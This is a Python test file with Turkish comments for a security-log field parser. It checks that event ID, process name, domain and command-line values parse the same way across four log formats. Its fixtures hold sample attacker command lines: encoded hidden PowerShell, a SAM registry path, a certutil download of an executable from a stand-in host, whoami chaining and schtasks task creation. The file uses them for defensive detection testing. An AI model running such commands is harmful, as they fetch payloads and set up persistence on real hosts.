"""Dort bug, DORT FORMATTA da kapali mi?

NEDEN VAR: Gorev 1'in sozlesme testleri yalnizca brace_kv fixture'larina
bakiyordu. space_kv'de B bug'i (deger ilk boslukta kesiliyor) AYNEN
duruyordu ve kimse gormedi -- ta ki dedup olcumu tesadufen ortaya cikarana
kadar.

MALIYETI: 60 senaryonun 16'si space_kv ve raw_log kategorisinin 9/10'u.
Kirpilmis komut satiri IKI ayri 60 senaryoluk olcumu kirletti (sorgu D kolu
ve dedup). Bir olcume dayanip karar verdik ve olcum bozuk veriyle alinmisti.

Bu dosya ayni sozlesmeyi HER formata uygular; ayni hatanin besinci kez
baska bir yolda cikmasini engeller."""

from __future__ import annotations

import pytest

from app.normalization.formats import detect_format, parse_fields

# Ayni olay dort bicimde. Dort bug'i da tetikleyecek sekilde kuruldu:
#   A: Pipe/Process/Object Name -> hepsi "Name" ile bitiyor
#   B: "NT AUTHORITY" ve cok kelimeli komut satiri
#   C: kapanis parantezi
#   D: "Event ID" bosluklu / "EventID" bitisik
ORNEKLER = {
    "brace_kv": (
        "{Pipe Name=N/A, Event ID=4688, Process Name=powershell.exe, "
        "User Domain=NT AUTHORITY, Object Name=\\REGISTRY\\MACHINE\\SAM, "
        "Command Line=powershell -enc ABC -w hidden, Trailing=son}"
    ),
    "space_kv": (
        "EventID=4688 NewProcessName=powershell.exe SubjectDomainName=NT AUTHORITY "
        "ObjectName=\\REGISTRY\\MACHINE\\SAM CommandLine=powershell -enc ABC -w hidden"
    ),
    "windows_message": (
        "An account was successfully logged on.\n\n"
        "Event ID:  4688\n"
        "Process Name:  powershell.exe\n"
        "Account Domain:  NT AUTHORITY\n"
        "Object Name:  \\REGISTRY\\MACHINE\\SAM\n"
        "Command Line:  powershell -enc ABC -w hidden\n"
    ),
    "json": (
        '{"Event ID": "4688", "Process Name": "powershell.exe", '
        '"User Domain": "NT AUTHORITY", "Object Name": "\\\\REGISTRY\\\\MACHINE\\\\SAM", '
        '"Command Line": "powershell -enc ABC -w hidden"}'
    ),
}

BEKLENEN = {
    "event.id": "4688",
    "process.name": "powershell.exe",
    "user.domain": "NT AUTHORITY",
    "object.name": "\\REGISTRY\\MACHINE\\SAM",
    "process.command_line": "powershell -enc ABC -w hidden",
}

BICIMLER = sorted(ORNEKLER)


@pytest.mark.parametrize("bicim", BICIMLER)
def test_format_is_detected(bicim):
    fmt = detect_format(ORNEKLER[bicim])
    assert fmt is not None and fmt.name == bicim


@pytest.mark.parametrize("bicim", BICIMLER)
@pytest.mark.parametrize("alan", sorted(BEKLENEN))
def test_every_bug_is_closed_in_every_format(bicim, alan):
    """Dort bug x dort format. Tek bir hucre bile bos kalmamali."""
    fields, _ = parse_fields(ORNEKLER[bicim])
    assert alan in fields, f"{bicim}: {alan} hic ayristirilamadi"
    assert fields[alan].text == BEKLENEN[alan], (
        f"{bicim}: {alan} yanlis ayristirildi"
    )


@pytest.mark.parametrize("bicim", BICIMLER)
def test_no_value_carries_a_delimiter(bicim):
    """C bug'i: kapanis parantezi ya da ayrac degerin icinde kalmamali."""
    fields, _ = parse_fields(ORNEKLER[bicim])
    kirli = {k: v.text for k, v in fields.items() if v.text.endswith(("}", ","))}
    assert not kirli, f"{bicim}: ayrac tasiyan degerler {kirli}"


# ---------------------------------------------------------------- space_kv sinir

def test_space_kv_value_ends_at_the_next_schema_field():
    """OLCULMUS VAKA: kirpilmis komut satiri iki olcumu kirletti.

    'certutil.exe -urlcache -split -f http://...' ifadesinin tamami
    gelmeli -- o logdaki TEK ayirt edici kanit odur."""
    fields, _ = parse_fields(
        "EventID=4688 NewProcessName=C:\\Windows\\System32\\certutil.exe "
        "CommandLine=certutil.exe -urlcache -split -f http://kotu.example/p.exe"
    )
    assert fields["process.command_line"].text == (
        "certutil.exe -urlcache -split -f http://kotu.example/p.exe"
    )


def test_an_equals_sign_inside_a_value_does_not_end_it():
    """'cmd /c set X=1' icindeki X= bir alan degil, komutun parcasi.
    Sinir SEMADAN turuyor: yalnizca tanimli bir alan adi degeri bitirir."""
    fields, _ = parse_fields(
        "EventID=4688 CommandLine=cmd /c set X=1 && whoami SubjectUserName=jdoe"
    )
    assert fields["process.command_line"].text == "cmd /c set X=1 && whoami"
    assert fields["account.name"].text == "jdoe"


def test_an_equals_sign_inside_a_value_does_not_create_a_field():
    """...ve kendisi ayri bir alan olarak da cikmamali: o 'X=' zaten baska
    bir alanin DEGERININ icinde."""
    fields, _ = parse_fields(
        "EventID=4688 CommandLine=cmd /c set X=1 && whoami SubjectUserName=jdoe"
    )
    assert "unknown.X" not in fields


def test_quoted_values_are_taken_whole():
    fields, _ = parse_fields(
        'EventID=4688 CommandLine="schtasks /create /tn X /tr powershell.exe" '
        "SubjectUserName=jdoe"
    )
    assert fields["process.command_line"].text == "schtasks /create /tn X /tr powershell.exe"
    assert fields["account.name"].text == "jdoe"
